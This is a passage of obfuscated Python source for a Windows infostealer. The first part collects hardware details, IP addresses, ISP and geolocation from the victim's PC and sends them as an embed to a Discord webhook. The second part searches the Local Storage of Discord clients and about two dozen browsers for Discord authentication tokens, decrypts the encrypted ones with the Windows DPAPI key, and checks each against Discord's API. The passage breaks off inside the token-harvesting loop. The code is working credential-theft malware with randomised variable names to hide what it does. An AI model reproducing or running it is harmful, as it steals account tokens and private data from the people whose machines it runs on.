    try: SLADBTOPRXUHZZVANBTAKKOTELJUKCPNXPUANXFQPNQGONUBCEKCAVAELFVHPSYNBCYQDOOCT = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: SLADBTOPRXUHZZVANBTAKKOTELJUKCPNXPUANXFQPNQGONUBCEKCAVAELFVHPSYNBCYQDOOCT = "None"

    try:
        JJZNCZSKQWNNLQIFYKTUAUVWGOGRNHUPWXGQFPCVSNWGCFUDCHHDCHXOIZDVMGLFLXFVIWYEKZSBDIDISCLEIEDGFRTIRFYA = []
        MKGNQXWMAWCDVUCGPNNOCXDDDHVGLEQQYVNBEKVUUTJLPONMMYWOFMZMJRARAKGISQKSTGPIRZXJKDYDQUCYUUBYWPASPMIY = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if MKGNQXWMAWCDVUCGPNNOCXDDDHVGLEQQYVNBEKVUUTJLPONMMYWOFMZMJRARAKGISQKSTGPIRZXJKDYDQUCYUUBYWPASPMIY & 1:
                TQCWITKPFGFFCOBZOUBFRCENYUUFNUFYXZEPXGRONNUUCNDHPXVOKWRWVOJUVRHKKUGN = v4r_letter + ":\\"
                try:
                    MIWVOHRXYVHUSCDRULPRUEAHRPEODHNWEXCKXHQRNVPHDZWOYDCACOKXATCQQKOATWYVRCJJUDHUGDZKHZNSOMSAOTECQSEVOKW = ctypes.c_ulonglong(0)
                    IYPZWLRIFLEBVMUAHRSJPWWRFJWQEMUMVAOFQFUGONLWAEZUWKXQAAHZLSJDAVLBZTJKKMWWPXYOTKHDCQYKKCOZWWUL = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(TQCWITKPFGFFCOBZOUBFRCENYUUFNUFYXZEPXGRONNUUCNDHPXVOKWRWVOJUVRHKKUGN), None, ctypes.pointer(IYPZWLRIFLEBVMUAHRSJPWWRFJWQEMUMVAOFQFUGONLWAEZUWKXQAAHZLSJDAVLBZTJKKMWWPXYOTKHDCQYKKCOZWWUL), ctypes.pointer(MIWVOHRXYVHUSCDRULPRUEAHRPEODHNWEXCKXHQRNVPHDZWOYDCACOKXATCQQKOATWYVRCJJUDHUGDZKHZNSOMSAOTECQSEVOKW))
                    KKARYMOXSWXTLLNMHBGGHTASGJOGCAZVRZAJFKVBYWDMKPDKQUINWY = IYPZWLRIFLEBVMUAHRSJPWWRFJWQEMUMVAOFQFUGONLWAEZUWKXQAAHZLSJDAVLBZTJKKMWWPXYOTKHDCQYKKCOZWWUL.value
                    CKWGGATCKHJZTJDIONTDTHVVGYKCTPODIGIXVJBHUEHATENLOIYEGFNAKMYQZSPSENEIWMLQZBZDXX = MIWVOHRXYVHUSCDRULPRUEAHRPEODHNWEXCKXHQRNVPHDZWOYDCACOKXATCQQKOATWYVRCJJUDHUGDZKHZNSOMSAOTECQSEVOKW.value
                    DUWKHKDCIIFSGNIPHYOBLDBHBVZUWPNVNEVGWCBSDPIUBMHDHJPWKJHLSBBJHXFSQTJQOX = KKARYMOXSWXTLLNMHBGGHTASGJOGCAZVRZAJFKVBYWDMKPDKQUINWY - CKWGGATCKHJZTJDIONTDTHVVGYKCTPODIGIXVJBHUEHATENLOIYEGFNAKMYQZSPSENEIWMLQZBZDXX
                    UXEETHOTKADATZCRVQGLDJDVDKYJHUQCHKBXVFCDJXSTAHBXRTVHSGPKFPOXLWAXMQELLQJ = win32api.GetVolumeInformation(TQCWITKPFGFFCOBZOUBFRCENYUUFNUFYXZEPXGRONNUUCNDHPXVOKWRWVOJUVRHKKUGN)[0]
                    drive = {
                        'drive': TQCWITKPFGFFCOBZOUBFRCENYUUFNUFYXZEPXGRONNUUCNDHPXVOKWRWVOJUVRHKKUGN,
                        'total': KKARYMOXSWXTLLNMHBGGHTASGJOGCAZVRZAJFKVBYWDMKPDKQUINWY,
                        'free': CKWGGATCKHJZTJDIONTDTHVVGYKCTPODIGIXVJBHUEHATENLOIYEGFNAKMYQZSPSENEIWMLQZBZDXX,
                        'used': DUWKHKDCIIFSGNIPHYOBLDBHBVZUWPNVNEVGWCBSDPIUBMHDHJPWKJHLSBBJHXFSQTJQOX,
                        'name': UXEETHOTKADATZCRVQGLDJDVDKYJHUQCHKBXVFCDJXSTAHBXRTVHSGPKFPOXLWAXMQELLQJ,
                    }
                    JJZNCZSKQWNNLQIFYKTUAUVWGOGRNHUPWXGQFPCVSNWGCFUDCHHDCHXOIZDVMGLFLXFVIWYEKZSBDIDISCLEIEDGFRTIRFYA.append(drive)
                except:
                    ()
            MKGNQXWMAWCDVUCGPNNOCXDDDHVGLEQQYVNBEKVUUTJLPONMMYWOFMZMJRARAKGISQKSTGPIRZXJKDYDQUCYUUBYWPASPMIY >>= 1

        WKKXVQJTASGWPGHFHLCZCFPQRETDLTMLNELKAOQBZQNNKESOTYTATJUUQCAZLRS = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in JJZNCZSKQWNNLQIFYKTUAUVWGOGRNHUPWXGQFPCVSNWGCFUDCHHDCHXOIZDVMGLFLXFVIWYEKZSBDIDISCLEIEDGFRTIRFYA:
            QEWGMVPURYAQBMSVFNMEPVXGREKLDVHNTZYGMBCMAVGWZOFAYDIWHVWRLUOPMKATHWTJCFQFPIX = (v4r_drive['used'] / v4r_drive['total']) * 100
            CKWGGATCKHJZTJDIONTDTHVVGYKCTPODIGIXVJBHUEHATENLOIYEGFNAKMYQZSPSENEIWMLQZBZDXX_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            KKARYMOXSWXTLLNMHBGGHTASGJOGCAZVRZAJFKVBYWDMKPDKQUINWY_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            QEWGMVPURYAQBMSVFNMEPVXGREKLDVHNTZYGMBCMAVGWZOFAYDIWHVWRLUOPMKATHWTJCFQFPIX_str = "{:.2f}%".format(QEWGMVPURYAQBMSVFNMEPVXGREKLDVHNTZYGMBCMAVGWZOFAYDIWHVWRLUOPMKATHWTJCFQFPIX)
            WKKXVQJTASGWPGHFHLCZCFPQRETDLTMLNELKAOQBZQNNKESOTYTATJUUQCAZLRS += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   CKWGGATCKHJZTJDIONTDTHVVGYKCTPODIGIXVJBHUEHATENLOIYEGFNAKMYQZSPSENEIWMLQZBZDXX_gb,
                                                                   KKARYMOXSWXTLLNMHBGGHTASGJOGCAZVRZAJFKVBYWDMKPDKQUINWY_gb,
                                                                   QEWGMVPURYAQBMSVFNMEPVXGREKLDVHNTZYGMBCMAVGWZOFAYDIWHVWRLUOPMKATHWTJCFQFPIX_str,
                                                                   v4r_drive['name'])
    except:
        WKKXVQJTASGWPGHFHLCZCFPQRETDLTMLNELKAOQBZQNNKESOTYTATJUUQCAZLRS = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            CNUIYLPXXOJSBBXOZWHRRYIUILJEKIGXXWYNUGGTDXGAZPKPXNSGVGTQQAQLZHHMKBBHBNEKUMOEQXYQBDIZJEVTLRIVDGCZGY = 'Pc Portable'
        else:
            CNUIYLPXXOJSBBXOZWHRRYIUILJEKIGXXWYNUGGTDXGAZPKPXNSGVGTQQAQLZHHMKBBHBNEKUMOEQXYQBDIZJEVTLRIVDGCZGY = 'Pc Fixed'
    except:
        CNUIYLPXXOJSBBXOZWHRRYIUILJEKIGXXWYNUGGTDXGAZPKPXNSGVGTQQAQLZHHMKBBHBNEKUMOEQXYQBDIZJEVTLRIVDGCZGY = "None"

    try: HNHQVACFHDFTBBJDCKMILLUVVMEXZQGRWRRXQWXAADFUEOVFORWBAWFLQDZEVZCRNMTKKRDZ = len(screeninfo.get_monitors())
    except: HNHQVACFHDFTBBJDCKMILLUVVMEXZQGRWRRXQWXAADFUEOVFORWBAWFLQDZEVZCRNMTKKRDZ = "None"

    embed = Embed(title=f'System Info {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:', color=TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {PLSWFVVDGTGSQJFCWPFRNKDGFQVTQIPVPSNXGAMEEDYFGBYWWCCSRXUPQGSBEKYPIEGNZAGX}
Username    : {IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}
DisplayName : {FSQVCRLMWMWRWMXEWTPOWNJLJAXMZFKMFVJNQLBTBDTQETIGMNRGEIUBLKPHBUSZPUGNMEASJRYRPYKAEWSZBZ}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {CNUIYLPXXOJSBBXOZWHRRYIUILJEKIGXXWYNUGGTDXGAZPKPXNSGVGTQQAQLZHHMKBBHBNEKUMOEQXYQBDIZJEVTLRIVDGCZGY}
Exploitation  : {AWRQHVHOUNBRYTFTLAGJLPGDZXVSSKKFIWNYPTLGMGYPBVWBFRBEBXNKMJILAPUEUEJGILUUWFBDAKXJSYUENLIMUWTRM} {OJRSXUHKWTXVERHCCHPAOZGMTFNSQCIUNODFIZKKBQTGGRNTOYZDZYW}
Screen Number : {HNHQVACFHDFTBBJDCKMILLUVVMEXZQGRWRRXQWXAADFUEOVFORWBAWFLQDZEVZCRNMTKKRDZ}

HWID : {LMSSWASIZEKVLYHAKENPYTCTHREUAAYNIGOWSMVMYABYEWXPBYBXCHXCGICAYINSNVSQJZGQHPFDNJMKL}
MAC  : {PVFNVXCLKRJCDGZUGNHZFPQQIDGKHEFHJIOMEWDSQSZAVUBUFNZIHXHTSCBAAIQ}
CPU  : {NPYJUZGYHJLKTJNVCGLHVEWHOYBRYHVWXYHOOHXRJEGNKPWDKFBSOKHREPNWUUPSQYRQKXHVFDZFMWGYABB}, {ZYLZDDTJHQVBZWNQKBYYESJCLMRRGCLBJUPRJRTZCJUXQXWSZILVLWPXGTZZYIRXCMRMKUNYLQZNKKIOFXDKXJ} Core
GPU  : {SLADBTOPRXUHZZVANBTAKKOTELJUKCPNXPUANXFQPNQGONUBCEKCAVAELFVHPSYNBCYQDOOCT}
RAM  : {ZEGGJCMAFWYHDZZUCGQWZIFKTOIRIDYDICMQOHUMUGVVJANHIWPICC}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV}
Local  : {XXCUTYNFANXCGKCGZZLTNVULTEBSNGRBNTZUCEFKXNLFTEAYYTKMPLPGMSWKQTFAGQZIOYE}
Isp    : {ABXEQPMLRLPWTUAJEBSPXYKHAIZJWEVDNMMAVCOQADLENEGAQCFCLYTDKGBDJDQWDNPKTAJPLCAEYKQRLICNVQFWFMXW}
Org    : {RZDHOJSFMAMUTVPJIGEFWVPTPTZUGSTEFICLZEQVYFKKIUVOCBYOJMXBHIGEPOSDBQB}
As     : {RBAEFCLQDKWJMYDGNCOGCLVJVFETBGCOLQQBCAGLRTIPVKTVMKDBWWSQUTYUXPVTCUQSKSIPPOQZFDIHXGPAAJJQULWRV}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{WKKXVQJTASGWPGHFHLCZCFPQRETDLTMLNELKAOQBZQNNKESOTYTATJUUQCAZLRS}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {EEKSUBIRMRTGSAVCDHXWCFSKFUZYPUINGMLXPMUCTJUZBUJLZKHEONAGJBFTGHWQRHQXWSQF} ({EEKSUBIRMRTGSAVCDHXWCFSKFUZYPUINGMLXPMUCTJUZBUJLZKHEONAGJBFTGHWQRHQXWSQF_code})
Region    : {LGTAKYFVIOGPMISZEVPGXCXQOJCSWUOQMAECSUGWINAFOJFISSUUPCGLZQCLLYIPQVSMBVCKHAVKVDMXOZXXKHPCHQYXTNDFAY} ({LGTAKYFVIOGPMISZEVPGXCXQOJCSWUOQMAECSUGWINAFOJFISSUUPCGLZQCLLYIPQVSMBVCKHAVKVDMXOZXXKHPCHQYXTNDFAY_code})
Zip       : {VSNVVQXMBSFIHATGTCWQVVWHCNMTJSWPHHOTISGWTIGGKZYTCGKTFGVHRDPZQON}
City      : {FNKOQKOVSVDOSZHKTUUQLVAQFBZEEFMOZLLMWKGRUYWYNTFEJLPRVFTUZMAV}
Timezone  : {OJXPKRSPBICXRLUGJHEIHECYUTPCBUYHKVZGYLDMOZGCDXPEQQZNQQHOQCTNUHKDRWVZTIOTMFPAH}
Latitude  : {YPWGIQRMYFLHJEUCEMASFDRZVMYZIKVYIZWUMJVPSSHMTTPNKH}
Longitude : {SOEKZPQWECPWBRNMVNKKTZLWDXERDUNXGKSFLUUAREXBGCLOIZAAIJRVRSMMSDKJPGHMLPCJWHQTWCXM}```""", inline=False)


    embed.set_footer(text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)

    BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU = SyncWebhook.from_url(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)
    BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU.send(embed=embed, username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE, avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)

def CIEMICBUWUBSRYWSIZAFLYMVRGNMIRISBUWZPATWDPXIQBMYWTIJRXRMBWAKSQUFGH():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def TYYXTZQLHTPEHPTPGDSSJHCKEXRWQPDXMGKEJXINYSWTLWAMUJT():
        WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ = "https://discord.com/api/v9/users/@me"
        QNQJNPEFSBYXHYGEAZVNRUAWCIVPLQEODBYSIUCIAVKLQZSPHQOBQRUANPDQLOCFLKOBICJJKSNBRNYYQVCMS = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        QNQJNPEFSBYXHYGEAZVNRUAWCIVPLQEODBYSIUCIAVKLQZSPHQOBQRUANPDQLOCFLKOBICJJKSNBRNYYQVCMS_enc = r"dQw4w9WgXcQ:[^\"]*"
        PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH = []
        OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR = []
        SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU = {}

        FTRYOFNMUNQWFXAIXSNXTNDZEWYZNPTSOENFUUSRQCXFVGYNILOBDRWRXKQNLRYGNIJYLGGMFLDRGBREWJNQT = {
            'Discord': OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB, FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY in FTRYOFNMUNQWFXAIXSNXTNDZEWYZNPTSOENFUUSRQCXFVGYNILOBDRWRXKQNLRYGNIJYLGGMFLDRGBREWJNQT.items():
            if not os.path.exists(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
                continue
            CZZAMDXDUJHLJMTVMLROBDKTZXYKPVEEQOXHJIBAZRTZQWMUCBHAYFBRENFEOEFGUCKQMXIHSDMEYLSEOFLBJYDRQQHXVUFF = TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB.replace(" ", "").lower()
            if "cord" in FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY:
                if not os.path.exists(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + f'\\{CZZAMDXDUJHLJMTVMLROBDKTZXYKPVEEQOXHJIBAZRTZQWMUCBHAYFBRENFEOEFGUCKQMXIHSDMEYLSEOFLBJYDRQQHXVUFF}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(QNQJNPEFSBYXHYGEAZVNRUAWCIVPLQEODBYSIUCIAVKLQZSPHQOBQRUANPDQLOCFLKOBICJJKSNBRNYYQVCMS_enc, v4r_line.strip()):
                                GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB = KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBYVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), KRGGXTMYYEWIVYSQFRMUZLWXZTWNIWZOJBABDVMGGQDKKHGXNOT(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR + f'\\{CZZAMDXDUJHLJMTVMLROBDKTZXYKPVEEQOXHJIBAZRTZQWMUCBHAYFBRENFEOEFGUCKQMXIHSDMEYLSEOFLBJYDRQQHXVUFF}\\Local State'))
                                if KYDKJXFDIGDIJOCKSNGTEAUXVEXQMXHYPYKTZNZEKHVEJILHBEWFOROKJOGHNLYG(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB, WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ):
                                    DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX = requests.get(WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ, headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB}).json()['id']
                                    if DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX not in OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR:
                                        PIJZOXNBDSGLELEBYCWYPZHWFHGCLJVLRGXNLMSACNOYJSFLSTGMCUDDRVLVCVIQKGVAEHLDUQXDTH.append(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB)
                                        OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR.append(DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX)
                                        SVGNTSRIIIAZLBMUDKMGUUBUTHRPUOOLHXUCISWXFVOXJJKMNYSJBQRKBVTCNGLJZUFTXAXGSQXKEOIEUXTJSGGZGU[GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB] = (TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB, f"{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB in re.findall(QNQJNPEFSBYXHYGEAZVNRUAWCIVPLQEODBYSIUCIAVKLQZSPHQOBQRUANPDQLOCFLKOBICJJKSNBRNYYQVCMS, v4r_line.strip()):
                                if KYDKJXFDIGDIJOCKSNGTEAUXVEXQMXHYPYKTZNZEKHVEJILHBEWFOROKJOGHNLYG(GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB, WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ):
                                    DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX = requests.get(WLNYRRGNPDHYLSDDODHRQWQHBHLAEKFOZGBOVZSDHEOOYCXOCSOOTAIXFKMSHOECVUMZ, headers={'Authorization': GTPOLYDLLYBCHQPSYZUMAXSQGGWIGOMIFAGRDRBUJIYRNLKDJSZQAMUTKCSAAAYEXTJUGYRMB}).json()['id']
                                    if DZWBTJQWIHMLSVBQKEXEMYAAVZRAPNSHDAWAUEUAFZJHFFIRGRIPMOMTWQSPXDJORYBKANZDCQLMDX not in OXPBROLQJJGAWAHJENKECCGKJBANEGSDXZPEPDJARBDVEFCEWEJWKWFMVZFSPGOROGZDALXAAVWTMTFRSIRR:
